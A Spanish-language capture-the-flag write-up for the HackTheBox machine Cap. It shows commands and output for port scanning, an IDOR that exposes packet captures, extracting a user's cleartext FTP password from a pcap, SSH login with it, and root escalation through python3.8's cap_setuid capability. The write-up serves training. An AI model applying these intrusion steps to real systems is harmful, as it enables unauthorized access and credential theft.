# Cap

## Información

La máquina a comprometer es **Cap** de **HackTheBox**.

![](/.gitbook/assets/Cap.png)


## Host discovery

La web de HackTheBox nos devuelva la ip de Cap, **10.10.10.245**.

Hacemos ping, con la VPN arrancada.

```bash
┌──(kali㉿kali)-[~/HTB/Cap]
└─$ ping -c 1 10.10.10.245
PING 10.10.10.245 (10.10.10.245) 56(84) bytes of data.
64 bytes from 10.10.10.245: icmp_seq=1 ttl=63 time=34.0 ms

--- 10.10.10.245 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 33.964/33.964/33.964/0.000 ms

```

La TTL ys nos indica que es una máquina Linux por cercanía a 64.

## Enumeración

Primero un escaneo para descubrir puertos:

```bash
┌──(kali㉿kali)-[~/HTB/Cap]
└─$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.245             
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-13 12:46 EST
Initiating SYN Stealth Scan at 12:46
Scanning 10.10.10.245 [65535 ports]
Discovered open port 22/tcp on 10.10.10.245
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
Completed SYN Stealth Scan at 12:46, 10.83s elapsed (65535 total ports)
Nmap scan report for 10.10.10.245
Host is up, received user-set (0.034s latency).
Scanned at 2024-01-13 12:46:31 EST for 11s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds
           Raw packets sent: 66494 (2.926MB) | Rcvd: 65535 (2.621MB)

```

Vemos tres puertos abiertos. Hacemos un escaneo mas exhaustivo:

```bash
──(kali㉿kali)-[~/HTB/Cap]
└─$ nmap -sCV -p21,22,80 10.10.10.245 -oN targeted                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-13 12:48 EST
Nmap scan report for 10.10.10.245
Host is up (0.034s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sat, 13 Jan 2024 17:48:14 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 13 Jan 2024 17:48:08 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 13 Jan 2024 17:48:08 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=1/13%Time=65A2CCD7%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,4C56,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\
SF:x20Sat,\x2013\x20Jan\x202024\x2017:48:08\x20GMT\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:19386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\
SF:">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20
SF:\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x
SF:20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<me
SF:ta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sca
SF:le=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"im
SF:age/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css
SF:\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/
SF:font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20r
SF:el=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20
SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.mi
SF:n\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/stati
SF:c/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpt
SF:ions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sat,
SF:\x2013\x20Jan\x202024\x2017:48:08\x20GMT\r\nConnection:\x20close\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,
SF:\x20HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t
SF:ext/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\
SF:x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bod
SF:y>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inv
SF:alid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;R
SF:TSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,
SF:189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Sat,\x2013\x20Jan\x202024\x2017:48:14\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x202
SF:32\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\
SF:x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</
SF:h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20
SF:server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2
SF:0check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.57 seconds

```

Intentamos acceder mediante ftp por el puerto 21 como usuario anonimo pero no nos lo permite. No se encuentran vulnerabilidades interesantes para esa versión de vsftpd.

Por el puerto 22 poco podemos hacer debido a que no disponemos de credenciales.

Vamos entonces a enumerar el puerto 80.

Hacemos un **whatweb**:

```bash
┌──(kali㉿kali)-[~/HTB/Cap]
└─$ whatweb http://10.10.10.245

http://10.10.10.245 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]


```

Tampoco nos dice mucho. Examinamos la Web.

![](/.gitbook/assets/cap01.png)

Revisamos todos los enlaces y el código fuente y resaltamos dos cosas.

* La págima nos muestra un posible usuario **nathan**.
* Dentro de las opciones de menu hay una que parece que genera un fichero de almacenamiento de paquetes **pcap** de 5 segundos y nos lleva  a descargarlo.

![](/.gitbook/assets/cap2.png)

Si jugamos con el **IDOR** en la url y ponemos el 0 vemos que nos descarga un fichero ya existente **0.pcap** ya que ha nosotros nos ha generado el **1.pcap**.

Tambien podemos hace un **OneLiner** en bash para descargar todos:

```bash
┌──(kali㉿kali)-[~/HTB/Cap]
└─$ mkdir pcaps     

┌──(kali㉿kali)-[~/HTB/Cap]
└─$  for i in {0..500} ; do wget http://10.10.10.245/download/${i} -O pcaps/${i}.pcap 2>/dev/null || break; done; rm pcaps/${i}.pcap

┌──(kali㉿kali)-[~/HTB/Cap]
└─$ cd pcaps 
                                      
┌──(kali㉿kali)-[~/HTB/Cap/pcaps]
└─$ lla   
total 24
drwxr-xr-x 2 kali kali 4096 Jan 13 13:04 .
drwxr-xr-x 3 kali kali 4096 Jan 13 13:04 ..
-rw-r--r-- 1 kali kali 9935 May 15  2021 0.pcap
-rw-r--r-- 1 kali kali  108 Jan 13 12:57 1.pcap

┌──(kali㉿kali)-[~/HTB/Cap/pcaps]
└─$ 

```
Revisamos el fichero **0.pcap** y vemos que tenemos una conexión FTP de **nathan** y sus credenciales.

```bash
┌──(kali㉿kali)-[~/HTB/Cap/pcaps]
└─$ tshark -r 0.pcap -Y "ftp" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.
```

## Explotación

Intentamos entrar como el usuario **nathan** y la contraseña encontrada y vemos que accedemos a la máquina y vemos la primera flag.

```bash
  ┌──(kali㉿kali)-[~/HTB/Cap/pcaps]
└─$ ssh nathan@10.10.10.245                                          
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 13 18:13:23 UTC 2024

  System load:           0.09
  Usage of /:            36.6% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             221
  Users logged in:       0
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:feb9:4c21

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ ls
user.txt
nathan@cap:~$ ls -la
total 28
drwxr-xr-x 3 nathan nathan 4096 May 27  2021 .
drwxr-xr-x 3 root   root   4096 May 23  2021 ..
lrwxrwxrwx 1 root   root      9 May 15  2021 .bash_history -> /dev/null
-rw-r--r-- 1 nathan nathan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 nathan nathan 3771 Feb 25  2020 .bashrc
drwx------ 2 nathan nathan 4096 May 23  2021 .cache
-rw-r--r-- 1 nathan nathan  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 May 27  2021 .viminfo -> /dev/null
-r-------- 1 nathan nathan   33 Jan 13 17:42 user.txt
nathan@cap:~$ 

```


## Escalada de privilegios

En este caso es muy sencilla. Buscamos primero ejecutables que tengan permiso de altos privilegios. Privilegios SUID o GUID, pero por este lado no encontramos nada.

Al llamarse la máquina **Cap** probamos a buscar por capabilities:

```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
nathan@cap:~$
```
Vemos que **python3.8** tiene la capability **cap_setuid** que permite cambiar de usuario. Sabiendo que el usuario root es 0 nos vamos a python por consola:

```bash
nathan@cap:~$ /usr/bin/python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("bash")
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# cd /root
root@cap:/root# ls -la
total 36
drwx------  6 root root 4096 Jan 13 17:42 .
drwxr-xr-x 20 root root 4096 Jun  1  2021 ..
lrwxrwxrwx  1 root root    9 May 15  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 May 23  2021 .cache
drwxr-xr-x  3 root root 4096 May 23  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 May 23  2021 .ssh
lrwxrwxrwx  1 root root    9 May 27  2021 .viminfo -> /dev/null
-r--------  1 root root   33 Jan 13 17:42 root.txt
drwxr-xr-x  3 root root 4096 May 23  2021 snap
root@cap:/root# 

```

Como hemos visto hemos utilizado la capabilitie para escalar privilegios y convertirnos en root.